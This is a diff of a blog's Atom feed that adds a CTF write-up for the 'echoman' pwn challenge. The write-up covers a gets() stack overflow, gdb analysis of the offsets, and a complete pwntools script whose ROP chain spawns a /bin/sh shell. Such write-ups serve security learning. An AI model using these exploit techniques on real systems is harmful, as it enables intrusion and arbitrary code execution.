@@ -1,5 +1,169 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>deadc0de.re</title><link href="https://deadc0de.re/" rel="alternate"></link><link href="https://deadc0de.re/feeds/all.atom.xml" rel="self"></link><id>https://deadc0de.re/</id><updated>2019-11-12T00:00:00+01:00</updated><subtitle>... rocking out ...</subtitle><entry><title>Scripting Ghidra with Python</title><link href="https://deadc0de.re/articles/ghidra-scripting-python.html" rel="alternate"></link><published>2019-11-12T00:00:00+01:00</published><updated>2019-11-12T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2019-11-12:/articles/ghidra-scripting-python.html</id><summary type="html">&lt;p&gt;Scripting Ghidra with Python&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post shortly gives a few examples to get started with scripting &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>deadc0de.re</title><link href="https://deadc0de.re/" rel="alternate"></link><link href="https://deadc0de.re/feeds/all.atom.xml" rel="self"></link><id>https://deadc0de.re/</id><updated>2019-11-15T00:00:00+01:00</updated><subtitle>... rocking out ...</subtitle><entry><title>ynotctf19 write-up: echoman</title><link href="https://deadc0de.re/articles/ynotctf-echoman.html" rel="alternate"></link><published>2019-11-15T00:00:00+01:00</published><updated>2019-11-15T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2019-11-15:/articles/ynotctf-echoman.html</id><summary type="html">&lt;p&gt;Ynotctf19 write-up: echoman&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is a write-up for the &lt;em&gt;echoman&lt;/em&gt; pwn of
+&lt;a href="https://www.blackalps.ch/ba-19/ctf.php"&gt;Ynotctf CTF at BlackAlps&lt;/a&gt;.
+The provided binary can be found
+&lt;a href="https://gitlab.com/deadc0de6/ctf/blob/master/2019-ynotctf-blackalps/echoman/echoman"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;The program&lt;/h2&gt;
+&lt;p&gt;The binary is a simple echo server.
+Here the string &lt;em&gt;TEST&lt;/em&gt; is entered:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./echoman
+Hi my name is Echoman
+Let me echo something for you !
+TEST
+Here iiit iiiis: TEST
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The binary's protections:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; checksec
+Canary                        : Yes
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;The vulnerabilities&lt;/h2&gt;
+&lt;p&gt;Using &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt; one gets quickly an overview of
+the vulnerability in the &lt;code&gt;echoman&lt;/code&gt; function:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;echoman&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+
+  &lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Let me echo something for you !&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Here iiit iiiis: %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can overflow the &lt;code&gt;buf&lt;/code&gt; buffer and take control of the program.&lt;/p&gt;
+&lt;p&gt;Using gdb, one can see how much we need to
+write in order to reach &lt;em&gt;saved rip&lt;/em&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; disas echoman
+Dump of assembler code for function echoman:
+   0x0000000000401d38 &amp;lt;+0&amp;gt;: push   rbp
+   0x0000000000401d39 &amp;lt;+1&amp;gt;: mov    rbp,rsp
+   0x0000000000401d3c &amp;lt;+4&amp;gt;: add    rsp,0xffffffffffffff80
+   0x0000000000401d40 &amp;lt;+8&amp;gt;: lea    rdi,[rip+0x7f2c1]        # 0x481008
+   0x0000000000401d47 &amp;lt;+15&amp;gt;:    call   0x410550 &amp;lt;puts&amp;gt;
+   0x0000000000401d4c &amp;lt;+20&amp;gt;:    lea    rax,[rbp-0x80]
+   0x0000000000401d50 &amp;lt;+24&amp;gt;:    mov    rdi,rax
+   0x0000000000401d53 &amp;lt;+27&amp;gt;:    mov    eax,0x0
+   0x0000000000401d58 &amp;lt;+32&amp;gt;:    call   0x410260 &amp;lt;gets&amp;gt;
+   0x0000000000401d5d &amp;lt;+37&amp;gt;:    lea    rax,[rbp-0x80]
+   0x0000000000401d61 &amp;lt;+41&amp;gt;:    mov    rsi,rax
+   0x0000000000401d64 &amp;lt;+44&amp;gt;:    lea    rdi,[rip+0x7f2bd]        # 0x481028
+   0x0000000000401d6b &amp;lt;+51&amp;gt;:    mov    eax,0x0
+   0x0000000000401d70 &amp;lt;+56&amp;gt;:    call   0x408fa0 &amp;lt;printf&amp;gt;
+   0x0000000000401d75 &amp;lt;+61&amp;gt;:    nop
+   0x0000000000401d76 &amp;lt;+62&amp;gt;:    leave
+   0x0000000000401d77 &amp;lt;+63&amp;gt;:    ret
+End of assembler dump.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we need to push 128 bytes (&lt;code&gt;0xffffffffffffff80 = -128&lt;/code&gt;)
+to overwrite the buffer, then
+8 bytes to overwrite &lt;em&gt;saved rbp&lt;/em&gt; (&lt;code&gt;push rbp&lt;/code&gt;)
+and finally 8 bytes to overwrite
+&lt;em&gt;saved rip&lt;/em&gt; and take control of the flow&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python -c &lt;span class="s1"&gt;&amp;#39;print(&amp;quot;A&amp;quot;*128 + &amp;quot;B&amp;quot;*8 + &amp;quot;C&amp;quot;*8)&amp;#39;&lt;/span&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Generating that in Python and then feeding it to the program
+shows us in gdb that the &lt;em&gt;saved rip&lt;/em&gt; is overwritten
+by &lt;code&gt;C&lt;/code&gt;s&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; info frame
+Stack level 0, frame at 0x7fffffffe340:
+ rip = 0x401d75 in echoman; saved rip = 0x4343434343434343
+ called by frame at 0x7fffffffe348
+ Arglist at 0x7fffffffe330, args:
+ Locals at 0x7fffffffe330, Previous frame&amp;#39;s sp is 0x7fffffffe340
+ Saved registers:
+  rbp at 0x7fffffffe330, rip at 0x7fffffffe338
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Exploit&lt;/h2&gt;
+&lt;p&gt;So we simply need to overflow (128+8 bytes) and then
+write our ROP chain to exploit it.&lt;/p&gt;
+&lt;p&gt;Ropper was able to automatically generate a working
+ROP chain:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ropper -f echoman --chain execve
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It is clearly nicer to build the ROP chain manually
+but due to time constraints &lt;code&gt;ropper&lt;/code&gt; provided us
+a nice working solution.&lt;/p&gt;
+&lt;p&gt;Here's the complete pwntools script to exploit it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
+
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+
+&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;
+
+&lt;span class="n"&gt;binary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;./echoman&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pwns.blackalps.lan&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2004&lt;/span&gt;
+
+&lt;span class="c1"&gt;#proc = remote(host, port)&lt;/span&gt;
+&lt;span class="n"&gt;proc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;binary&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;started ...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Let me echo something for you !&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Q&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;IMAGE_BASE_0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0000000000400000&lt;/span&gt; &lt;span class="c1"&gt;# 2d2f5423e4ac9faa4d94827cb210852f4fc1505e432b58994704d6c2fe66b116&lt;/span&gt;
+&lt;span class="n"&gt;rebase_0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;IMAGE_BASE_0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000000327d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x000000000040327d: pop r13; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;//bin/sh&amp;#39;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0000000000001f9b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x0000000000401f9b: pop rbx; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000aa0e0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000005c3a5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x000000000045c3a5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000000327d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x000000000040327d: pop r13; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0000000000000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0000000000001f9b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x0000000000401f9b: pop rbx; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000aa0e8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000005c3a5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x000000000045c3a5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000000182a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x000000000040182a: pop rdi; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000aa0e0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000079be&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x00000000004079be: pop rsi; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000aa0e8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000722db&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x00000000004722db: pop rdx; pop rbx; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x00000000000aa0e8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeefdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0000000000046a20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x0000000000446a20: pop rax; ret;&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x000000000000003b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;rop&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rebase_0&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0000000000015244&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 0x0000000000415244: syscall; ret;&lt;/span&gt;
+
+&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;
+&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
+&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;rop&lt;/span&gt;
+&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# profit&lt;/span&gt;
+&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</content><category term="post"></category><category term="ctf"></category><category term="pwn"></category><category term="write-up"></category><category term="rop"></category></entry><entry><title>Scripting Ghidra with Python</title><link href="https://deadc0de.re/articles/ghidra-scripting-python.html" rel="alternate"></link><published>2019-11-12T00:00:00+01:00</published><updated>2019-11-12T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2019-11-12:/articles/ghidra-scripting-python.html</id><summary type="html">&lt;p&gt;Scripting Ghidra with Python&lt;/p&gt;</summary><content type="html">&lt;p&gt;This post shortly gives a few examples to get started with scripting &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt;
 using Python.&lt;/p&gt;
 &lt;h1&gt;Where to get help&lt;/h1&gt;
 &lt;ul&gt;
